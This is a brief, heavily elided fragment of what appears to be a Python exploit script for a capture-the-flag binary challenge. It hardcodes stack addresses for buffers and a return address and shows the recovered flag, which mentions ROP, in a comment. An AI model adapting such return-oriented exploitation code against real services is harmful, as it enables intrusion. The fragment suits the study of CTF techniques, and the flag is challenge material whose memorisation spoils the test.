...
"""
    ...
    with connect() as tube:
        ...
        stack_delta = int(os.getenv("STACK_DELTA", "0"))  # 16 for remote
        username_buf_addr = 0x400080FA80 + stack_delta
        # username_buf_addr_addr = 0x400080fac8 + stack_delta
        password_buf_addr = 0x400080FA50 + stack_delta
        password_buf_addr_addr = 0x400080FAC0 + stack_delta
        retaddr_addr = 0x400080FB10 + stack_delta
        ...
        tube.send("\r\n")
        print(tube.recvline().strip().decode())  # flag{rop_on_t1111111le-gx_is_funny_27b7d3}
